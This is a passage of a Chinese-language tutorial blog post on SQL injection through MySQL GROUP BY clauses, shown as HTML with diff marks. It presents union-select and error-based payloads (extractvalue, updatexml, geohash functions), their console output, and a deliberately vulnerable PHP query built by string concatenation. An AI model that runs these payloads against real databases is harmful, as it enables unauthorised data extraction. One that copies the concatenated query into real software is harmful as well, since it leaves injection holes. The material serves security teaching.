+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739974.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739974.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739974.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739974.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 724;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="联合查询" class="heading-element"><span>联合查询</span>
+  <a href="#%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>接下来看下联合查询的情况</p>
+<p>众所周知，Where 后的注入点可以用 union select 联合查询，并且能控制回显位置。那么group by呢？</p>
+<p>Group by 后面可以接union select，但无法控制回显位置。</p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740028.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740028.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740028.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740028.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 310;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但但是，group by用于分类查询，limit语句只能放在后面位置，可以通过注释符注释掉它。</p>
+<p>例如，我们需要查询前3个用户名为admin开头的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">3</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="c1">-- limit 3;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="mi">2</span><span class="w">        </span><span class="o">|</span><span class="w"> </span><span class="mi">3</span><span class="w">        </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">6</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739913.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739913.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739913.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161739913.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 488;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>修改PHP SQL查询语句：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;select * from users where username like &#39;admin%&#39; group by </span><span class="si">$groupby</span><span class="s2"> limit 3&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>试着在group by后面拼接union select成功：</p>
+<p>Payload:<code>groupby=id union select 1,user(),version()</code></p>
+<p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740153.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740153.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740153.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740153.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 435;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="报错注入" class="heading-element"><span>报错注入</span>
+  <a href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>报错注入也简单，直接在group by后续位置插入报错语句即可：</p>
+<h4 id="xpath报错" class="heading-element"><span>XPath报错</span>
+  <a href="#xpath%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="p">,(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;~&#39;</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()))));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~8.0.31&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~8.0.31~&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="geohash报错" class="heading-element"><span>Geohash报错</span>
+  <a href="#geohash%e6%8a%a5%e9%94%99" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>Geohash报错在5.7.26上成功了，但是在8.0.31上失败了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">mysql</span><span class="w"> </span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="mi">1</span><span class="p">,(</span><span class="n">ST_LongFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LONGFROMGEOHASH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="mi">1</span><span class="p">,(</span><span class="n">ST_PointFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">st_pointfromgeohash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin%&#39;</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">users</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="mi">1</span><span class="p">,(</span><span class="n">ST_LatFromGeoHash</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">())));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1411</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">Incorrect</span><span class="w"> </span><span class="n">geohash</span><span class="w"> </span><span class="n">value</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;5.7.26&#39;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">ST_LATFROMGEOHASH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740311.png" alt="图片" srcset="/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740311.png?size=small, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740311.png?size=medium 1.5x, /posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/resource/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BGroupBy%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5.assets/640-20230814161740311.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 171;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
